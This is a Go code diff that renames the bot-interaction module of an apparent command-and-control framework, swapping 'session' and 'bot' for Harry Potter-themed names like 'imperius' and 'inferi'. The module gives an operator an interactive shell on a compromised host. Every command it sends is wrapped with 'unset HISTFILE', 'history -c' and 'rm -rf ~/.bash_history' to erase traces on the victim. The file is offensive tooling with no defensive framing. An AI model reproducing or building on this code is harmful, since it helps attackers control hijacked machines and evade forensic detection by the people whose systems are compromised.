@@ -1,4 +1,4 @@
-package modules
+package chambers
 
 import (
 	"fmt"
@@ -15,46 +15,46 @@ import (
 	"github.com/chzyer/readline"
 )
 
-var session types.Module = types.Module{
-	Name:        "session",
-	Description: "Interact with a session (bot)",
+var imperius types.Chamber = types.Chamber{
+	Name:        "imperius",
+	Description: "Interact with a imperius",
 	Parallel:    false,
-	Options:     sessionOptions,
+	Runes:     imperiusRuness,
 	Execute:     InteractWithSession,
 }
 
-var sessionOptions map[string]*types.Option = map[string]*types.Option{
-	"BOT": {
-		Name:        "BOT",
-		Description: "The target bot-id to handle interaction",
+var imperiusRuness map[string]*types.Rune = map[string]*types.Rune{
+	"INFERI": {
+		Name:        "INFERI",
+		Description: "The target inferi-id to handle interaction",
 		Required:    true,
 		Value:       nil,
 	},
 }
 
 var interruptChannel chan struct{} = make(chan struct{})
-func InteractWithSession(options map[string]*types.Option) {
-	idOption, ok := options["BOT"]
+func InteractWithSession(runes map[string]*types.Rune) {
+	idRunes, ok := runes["INFERI"]
 	if !ok {
-		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "BOT"), true)
+		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "INFERI"), true)
 		return
 
 	}
 
-	sessionID, ok := idOption.Value.(string)
+	imperiusID, ok := idRunes.Value.(string)
 	if !ok {
-		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid sessionID str (bot-00000)\n", idOption.Name), true)
+		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid inferi ID str (inferi-00000)\n", idRunes.Name), true)
 		return
 
 	}
 
-	var session *ListenerSession
+	var imperius *MarauderInferi
 	var exists bool
 
-	session, exists = Sessions[sessionID]
+	imperius, exists = Inferis[imperiusID]
 
 	if !exists {
-		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found session with id", sessionID), true)
+		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found inferi with id", imperiusID), true)
 		return
 
 	}
@@ -66,9 +66,9 @@ func InteractWithSession(options map[string]*types.Option) {
 
 	}
 
-	botIP, _ := misc.Colors(session.BotIP, "red")
-	promptSignal, _ := misc.Colors("▶▶", "white_bold")
-	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"
+	botIP, _ := misc.Colors(imperius.BotIP, "green")
+	promptSignal, _ := misc.Colors("⌁", "white_bold")
+	endFromListener := "___END__OF__RESULT__IN__" + imperius.ID + "__" + imperius.BotIP + "___"
 	prompt := fmt.Sprintf("%v %v ", botIP, promptSignal)
 	signal.Stop(misc.InterruptSigs)
 	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)
@@ -102,14 +102,14 @@ func InteractWithSession(options map[string]*types.Option) {
 
 			}
 
-			session.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)
+			imperius.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)
 
 			var fullResponse []string
 			var finishedPrinting bool
 
 			for !finishedPrinting {
 				select {
-				case output := <-session.Outputs:
+				case output := <-imperius.Outputs:
 					trimOutput := strings.TrimSpace(output)
 					if trimOutput == endFromListener {
 						finishedPrinting = true
@@ -141,6 +141,6 @@ func InteractWithSession(options map[string]*types.Option) {
 }
 
 func init() {
-	RegisterNewModule(&session)
+	RegisterNewModule(&imperius)
 
 }
